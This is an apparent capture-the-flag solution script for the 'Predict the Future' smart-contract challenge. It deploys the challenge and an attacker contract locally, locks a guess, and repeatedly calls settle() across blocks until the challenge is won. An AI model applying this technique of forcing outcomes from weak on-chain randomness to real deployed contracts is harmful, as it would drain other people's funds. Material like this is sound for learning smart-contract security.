import { ethers } from "hardhat";

async function main() {
    const PredictTheFutC = await ethers.getContractFactory(
        "PredictTheFutureChallenge"
    );
    const predictTheFutC = await PredictTheFutC.deploy({
        value: ethers.utils.parseEther("1.0"),
    });
    await predictTheFutC.deployed();

    const AttackerPTF = await ethers.getContractFactory("AttackerPTF");
    const attackerPTF = await AttackerPTF.deploy(predictTheFutC.address, {
        value: ethers.utils.parseEther("1.0"),
    });
    await attackerPTF.deployed();

    var _n = Math.floor(Math.random() * 10);
    await attackerPTF.lockGuess(_n);

    var counter = 0;
    var blockLimit = 100;
    while (counter < blockLimit) {
        var blockNumber = await ethers.provider.getBlockNumber();
        console.log(blockNumber);
        try {
            await attackerPTF.settle();
            var isComplete = await predictTheFutC.isComplete();
            console.log(isComplete);
            if (isComplete) break;
        } catch (error) {
            console.log("Error");
        }
        counter++;
    }
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
